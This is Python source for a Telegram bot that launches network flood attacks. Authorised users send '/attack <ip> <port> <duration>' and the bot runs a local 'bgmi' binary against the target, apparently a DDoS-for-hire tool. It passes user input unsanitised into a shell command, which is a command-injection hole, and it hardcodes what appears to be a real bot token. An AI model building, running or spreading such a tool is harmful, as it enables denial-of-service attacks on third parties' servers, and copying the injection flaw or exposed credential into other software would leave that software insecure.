import asyncio
import socket
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7384442199:AAFUKtDQz53FQsVLwd34iyI8Sqn0dZZYYMI'
ADMIN_USER_ID = 7265678519
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

def resolve_target(target):
    try:
        socket.inet_aton(target)
        return target
    except socket.error:
        try:
            ip = socket.gethostbyname(target)
            print(f"[DNS] Resolved {target} -> {ip}")
            return ip
        except Exception as e:
            print(f"[DNS] Failed: {e}")
            return target

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    msg = "*🔥 Welcome! 🔥*\n\n*Use /attack   *\n*Ex: /attack 8.8.8.8 80 30*"
    await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized*", parse_mode='Markdown')
        return
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*/manage <add|rem> <user_id>*", parse_mode='Markdown')
        return
    cmd, uid = args[0], args[1].strip()
    if cmd == 'add':
        users.add(uid)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {uid} added*", parse_mode='Markdown')
    elif cmd == 'rem':
        users.discard(uid)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {uid} removed*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True
    try:
        resolved_ip = resolve_target(ip)
        if not os.path.exists('./bgmi'):
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ bgmi binary missing*", parse_mode='Markdown')
            return
        await context.bot.send_message(chat_id=chat_id, text=f"*🎯 Attacking {resolved_ip}:{port} for {duration}s*", parse_mode='Markdown')
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {resolved_ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout and b"EXPIRED" in stdout:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Binary expired!*", parse_mode='Markdown')
            return
        if stdout: print(stdout.decode())
        if stderr: print(stderr.decode())
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Not authorized*", parse_mode='Markdown')
        return
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already running*", parse_mode='Markdown')
        return
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*/attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Attack Launched! {ip}:{port} for {duration}s*", parse_mode='Markdown')
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("manage", manage))
    app.add_handler(CommandHandler("attack", attack))
    print("[+] Bot started!")
    app.run_polling()

if __name__ == '__main__':
    main()
